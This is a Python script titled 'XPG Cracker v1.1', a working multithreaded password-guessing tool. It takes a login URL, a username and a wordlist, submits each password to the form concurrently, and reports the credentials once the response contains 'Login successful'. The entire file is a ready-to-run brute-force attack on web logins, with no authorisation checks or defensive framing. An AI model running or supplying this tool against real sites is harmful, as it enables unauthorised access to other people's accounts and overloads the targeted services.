import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
print("XPG Cracker v1.1")
delay = 1 

url = input("Login URL? (e.g. http://localhost:5000/login): ")


base_url = url.rsplit('/', 1)[0]
try:
    check = requests.head(base_url, timeout=5)
    if check.status_code == 404:
        print("Error: Base URL not found (404)")
        exit()
    elif check.status_code >= 400:
        print(f"Error: Server returned status code {check.status_code}")
        exit()
except requests.exceptions.RequestException as e:
    print(f"Could not connect to the base URL: {e}")
    exit()

username = input("username? ")
wordlist_path = input("wordlist path, preferably same folder as cracker. [.txt]: ")
max_workers = input("Max workers? higher number, higher performance, more resources. [10 by default]: ") or 10

def try_password(password):
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=0.2)
        # Debug: print status code and a snippet of the response
        # print(f"Trying {username} / {password} | Status: {response.status_code} | Response: {response.text[:100]}")
        if "Login successful" in response.text:
            return password
    except requests.exceptions.RequestException as e:
        print(f"Request failed for {username} / {password}: {e}")
    return None

def dictionary_attack(username, wordlist):
    try:
        with open(wordlist, "r", encoding="utf-8") as file:
            passwords = [line.strip() for line in file]

        with ThreadPoolExecutor(int(max_workers)) as executor:
            futures = {executor.submit(try_password, pwd): pwd for pwd in passwords}
            with tqdm(total=len(passwords), desc="Cracking", unit="attempt") as pbar:
                for future in as_completed(futures):
                    pbar.update(1)
                    result = future.result()
                    if result:
                        print(f"\n[+] Login found: {username} / {result}")
                        executor.shutdown(cancel_futures=True)
                        return username, result

        print("\n[-] No valid login found.")
    except FileNotFoundError:
        print("[!] Wordlist not found.")

dictionary_attack(username, wordlist_path)
